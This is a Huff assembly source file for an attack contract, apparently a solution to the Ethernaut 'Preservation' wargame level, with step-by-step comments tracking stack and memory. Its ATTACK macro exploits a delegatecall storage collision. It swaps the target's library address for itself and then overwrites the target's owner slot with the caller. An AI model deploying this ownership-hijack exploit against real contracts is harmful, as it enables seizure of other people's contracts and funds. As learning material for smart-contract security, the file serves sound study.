// Storage 
#define constant TIME_ZONE_1_SLOT = FREE_STORAGE_POINTER()
#define constant OWNER_SLOT = FREE_STORAGE_POINTER()
#define constant INSTANCE_OWNER_SLOT = FREE_STORAGE_POINTER()
#define constant INSTANCE_SLOT = FREE_STORAGE_POINTER()

// Constructor
#define macro CONSTRUCTOR() = takes (0) returns (0) {
    // Copy caller into OWNER_SLOT in storage
    caller          // [msg.sender] - msg.sender
    [OWNER_SLOT]    // [0x01, msg.sender] OWNER_SLOT is the 1st slot in storage
    sstore          // [] - sstore consumes top 2 stack items. The first item is
                    // the key (storage location) and the second item is the value (item to store)

    // Copy constructor argument (address) into memory
    0x20            // [0x20] - This will be the size for the the code we will copy to memory
    dup1            // [0x20, 0x20] - This will be used to calculate offset for which we will copy code from current environment
    codesize        // [code_size, 0x20, 0x20] - codesize pushes the size of code in current environment on to stack
    sub             // [offset, 0x20] - sub consumes top two items off stack and subtracts item 1 from item 2. Used to calculate offset for codecopy
    returndatasize  // [0x00, offset, 0x20] - 0x00 is the destination offset in memory for the code we will copy
    codecopy        // [] - codecopy consumes top 3 items off stack. codecopy(destOffset, offset, size)

    // Copy address from memory into INSTANCE_SLOT in storage
    returndatasize  // [0x00] - This is the offset in memory for which to copy 32 bytes from (our address param) 
    mload           // [address_param] - mload consumes top item off stack and pushes 32 bytes from that offset in memory onto stack => mload(offset)
    [INSTANCE_SLOT] // [0x03, address_param] - INSTANCE_SLOT is the 3rd storage slot where we will store address_param
    sstore          // [] - sstore consumes top two items off stack. sstore(key, value)
}

// Modifier
#define macro ONLY_OWNER() = takes (0) returns (0) {
    caller          // [msg.sender]
    [OWNER_SLOT]    // [0x01] - storage slot where owner is stored
    sload           // [owner] - loaded owner address onto stack from storage slot 0x01
    eq              // [0/1] - consumes top two items and returns 1 if equal, 0 otherwise
    is_owner        // [is_owner_label, 0/1] - byte offset in code for execution path
    jumpi           // [] - consumes top two items and execution path jumps to is_owner_label if 2nd item is not 0

    0x00            // [0x00] - size
    0x00            // [0x00, 0x00] - byte offset
    revert          // [] - reverts with data of size 0x00, starting from byte offset 0x00 in memory (reverts with no data)

    is_owner:       // is_owner label. execution continues here is the caller is the owner
}

// Attack function
#define macro ATTACK() = takes(1) returns (0) {
    // Copy `setFirstTime(uint256)` and self into memory to use as calldata for CALL   
    0xf1e02620      // [0xf1e02620] - func sig for `setFirstTime(uint256)`
    0x00            // [0x00, 0xf1e02620] - byte offset
    mstore          // [] - copied func sig into memory starting at offset 0x00
    address         // [self]
    0x20            // [0x20, self] - byte offset
    mstore          // [] - copied self into memory starting at offset 0x20

    // MEMORY:
    // [OFFSET 0]  00000000000000000000000000000000000000000000000000000000f1e02620 -> `setFirstTime(uint256)` func sig
    // [OFFSET 32] 0000000000000000000000004b3e65104805a303c274f078127d5a7e9f9b47b2 -> self

    // CALL into instance
    [INSTANCE_SLOT] // [0x03] - storage slot where instance address is 
    sload           // [instance] - copied instance address to stack from storage slot 0x03
    0x00            // [0x00, instance] - size of return data (none)
    0x00            // [0x00, 0x00, instance] - byte offset in memory where return data is copied
    0x24            // [0x24, 0x00, 0x00, instance] - size of calldata
    0x1c            // [0x1c, 0x24, 0x00, 0x00, instance] - byte offset in memory where calldata starts
    0x00            // [value, 0x1c, 0x24, 0x00, 0x00, instance] - msg.value to send with call (none)
    dup6            // [instance, value, 0x1c, 0x24, 0x00, 0x00, instance] - calling instance
    gas             // [gas, instance, value, 0x1c, 0x24, 0x00, 0x00, instance] - gas to send with call (gasleft())
    call            // [success, instance] - consumes top 7 items and pushes 1 onto stack if call did not revert, 0 otherwise
    iszero          // [0/1, instance]
    throw_error     // [throw_error, 0/1, instance]
    jumpi           // [instance]

    // Copy `timeZone1Library()` func sig into memory to use as calldata for STATICCALL
    0x3dc79422      // [0x3dc79422, instance] - func sig for `timeZone1Library()`
    0x40            // [0x00, 0x3dc79422, instance] - byte offset
    mstore          // [instance] - copied func sig into memory starting at offset 0x40

    // MEMORY:
    // [OFFSET 0]  00000000000000000000000000000000000000000000000000000000f1e02620 -> `setFirstTime(uint256)` func sig
    // [OFFSET 32] 0000000000000000000000004b3e65104805a303c274f078127d5a7e9f9b47b2 -> self
    // [OFFSET 64] 000000000000000000000000000000000000000000000000000000003dc79422 -> `timeZone1Library()` func sig

    // STATICCALL into instance
    0x20           // [0x20, instance] - size of return data (address)
    0x20           // [0x20, 0x20, instance] - byte offset in memory where return data will be copied
    0x04           // [0x04, 0x20, 0x20, instance] - size of calldata
    0x5c           // [0x5c, 0x04, 0x20, 0x20, instance] - byte offset in memory where calldata starts
    dup5           // [instance, 0x5c, 0x04, 0x20, 0x20, instance] - calling instance
    gas            // [gas, instance, 0x5c, 0x04, 0x20, 0x20, instance] - gas to send with call (gasleft())
    staticcall     // [success, instance] - consumes 6 items off stack and pushes 1 onto stack if call succeeded, 0 otherwise
    iszero         // [0/1, instance]
    throw_error    // [throw_error, 0/1, instance]
    jumpi          // [instance]

    // MEMORY:
    // [OFFSET 0]  00000000000000000000000000000000000000000000000000000000f1e02620 -> `setFirstTime(uint256)` func sig
    // [OFFSET 32] 0000000000000000000000004b3e65104805a303c274f078127d5a7e9f9b47b2 -> return data
    // [OFFSET 64] 000000000000000000000000000000000000000000000000000000003dc79422 -> `timeZone1Library()` func sig

    // Check return data and verify that it is equal to self
    0x20           // [0x20, instance] - byte offset
    mload          // [return_data, instance] - copied return data onto stack from byte offset 0x20
    address        // [self, return_data, instance] - self
    xor            // [xor_value, instance] - consumes top two items. performs bitwise xor operation. Pushes 0 if items are equal
    throw_error    // [throw_error, xor_value, instance]
    jumpi          // [instance]

    // copy owner into memory to use as calldata for CALL
    caller         // [owner, instance] - msg.sender is owner due to modifier
    dup1           // [owner, owner, instance] - duplicate owner for future comparison
    0x20           // [0x20, owner, owner, instance] - byte offset
    mstore         // [owner, instance] - copied owner into memory starting from offset 0x20

    // MEMORY:
    // [OFFSET 0]  00000000000000000000000000000000000000000000000000000000f1e02620 -> `setFirstTime(uint256)` func sig
    // [OFFSET 32] 00000000000000000000000001e59ce931b4cfea3fe4b875411e280e173cb7a9c -> owner
    // [OFFSET 64] 000000000000000000000000000000000000000000000000000000003dc79422 -> `timeZone1Library()` func sig

    // CALL into instance (setFirstTime)
    0x00            // [0x00, owner, instance] - size of return data (none)
    0x00            // [0x00, 0x00, owner, instance] - byte offset in memory where return data is copied
    0x24            // [0x24, 0x00, 0x00, owner, instance] - size of calldata
    0x1c            // [0x1c, 0x24, 0x00, 0x00, owner, instance] - byte offset in memory where calldata starts
    0x00            // [value, 0x1c, 0x24, 0x00, 0x00, owner, instance] - msg.value to send with call (none)
    dup7            // [instance, value, 0x1c, 0x24, 0x00, 0x00, owner, instance] - calling instance
    gas             // [gas, instance, value, 0x1c, 0x24, 0x00, 0x00, owner, instance] - gas to send with call (gasleft())
    call            // [success, owner, instance] - consumes top 7 items and pushes 1 onto stack if call did not revert, 0 otherwise
    iszero          // [0/1, owner, instance]
    throw_error     // [throw_error, 0/1, owner, instance]
    jumpi           // [owner instance]

    // Copy `owner()` into memory to use as calldata for STATICCALL
    0x8da5cb5b      // [0x8da5cb5b, owner, instance] - func sig for `owner()`
    0x40            // [0x40, 0x8da5cb5b, owner, instance] - byte offset
    mstore          // [owner, instance] - copied func sig into memory starting at byte offset 0x40

    // MEMORY:
    // [OFFSET 0]  00000000000000000000000000000000000000000000000000000000f1e02620 -> `setFirstTime(uint256)` func sig
    // [OFFSET 32] 0000000000000000000000004b3e65104805a303c274f078127d5a7e9f9b47b2 -> return data
    // [OFFSET 64] 000000000000000000000000000000000000000000000000000000008da5cb5b -> `owner()` func sig

    // STATICCALL into instance
    0x20            // [0x20, owner, instance] - size of return data (address)
    0x20            // [0x20, 0x20, owner, instance] - byte offset in memory where return data is copied
    0x04            // [0x04, 0x20, 0x20, owner, instance] - size of calldata
    0x5c            // [0x5c, 0x04, 0x20, 0x20, owner, instance] - byte offset in memory where calldata starts
    dup6            // [instance, 0x5c, 0x04, 0x20, 0x20, owner, instance] - calling instance
    gas             // [gas, instance, 0x5c, 0x04, 0x20, 0x20, owner, instance] - gas to send with call (gasleft())
    staticcall      // [success, owner, instance] - consumes top 7 items. Returns 1 if call didn't revert, 0 otherwise
    iszero          // [0/1, owner, instance]
    throw_error     // [throw_error, 0/1, owner, instance]
    jumpi           // [owner, instance]

    // MEMORY:
    // [OFFSET 0]  00000000000000000000000000000000000000000000000000000000f1e02620 -> `setFirstTime(uint256)` func sig
    // [OFFSET 32] 0000000000000000000000001e59ce931B4CFea3fe4B875411e280e173cB7A9C -> return data - owner() call
    // [OFFSET 64] 000000000000000000000000000000000000000000000000000000008da5cb5b -> `owner()` func sig

    // Check return data to verify it is equal to owner
    0x20            // [0x20, owner, instance] - byte offset
    mload           // [return_data, owner, instance] - copied return data onto stack starting from offset 0x20 in memory
    xor             // [xor_value, instance] - consumes top two items and performs bitwise xor. If items are equal, 0 is pushed onto stack
    throw_error     // [throw_error, xor_value, instance]
    jumpi           // [instance]
    pop             // []

    stop
}

// setTime function
#define macro SET_TIME() = takes (1) returns (0) {
    // Copy owner address from calldata into storage slot 0x02
    [INSTANCE_OWNER_SLOT] // [0x02, param] - storage slot 0x02
    sstore          // [] - copied owner address to storage slot 0x02
}


// Function Dispatching
#define macro MAIN() = takes (0) returns (0) {
    // Identify which function is being called
    0x00         // [0x00] - the byte offset in calldata that we will read 32 bytes from
    calldataload // [calldata] - calldataload consumes top item from stack and pushes 32 bytes of calldata, from byte offset, onto stack
    0xe0         // [0xe0, calldata] - 0xe0 is 224 bits
    shr          // [func_sig] - shr consumes top two items off the stack, performs a logical right shift and pushes resulting value of stack
                 // Here we are shifting the calldata 224 bits to the right (256 - 224 = 32 bits = 4 bytes) and isolating the first 4 bytes (function sig)

    dup1         // [func_sig, func_sig]
    0x9e5faafc   // [0x9e5faafc, func_sig, func_sig] - pushing func sig of 'attack' onto the stack
    eq           // [0/1, func_sig] - eq consumes top two items from stack and pushes 1 onto stack if they are equal, otherwise 0
    attack       // [attack, 0/1, func_sig] - attack is a label (byte offset) for the attack instructions
    jumpi        // [func_sig] = jumpi consumes top two items from stack and jumps to new execution path if second item is not 0, otherwise executions continues on current path

    dup1         // [func_sig, func_sig]
    0x3beb26c4   // [0x3beb26c4, func_sig, func_sig] - pushing func sig of 'setTime(uint256)' onto the stack
    eq           // [0/1, func_sig] - eq consumes top two items from stack and pushes 1 onto stack if they are equal, otherwise 0
    set_time     // [set_time, 0/1, func_sig] - set_time is a label (byte offset) for the attack instructions
    jumpi        // [func_sig] = jumpi consumes top two items from stack and jumps to new execution path if second item is not 0, otherwise executions continues on current path


    throw_error: // label for revert path
        0x00 0x00 revert

    attack:      // label for attack instructions
        ONLY_OWNER()
        ATTACK()

    set_time:   // label for setTime instructions
        0x04
        calldataload // [param]
        SET_TIME()
}
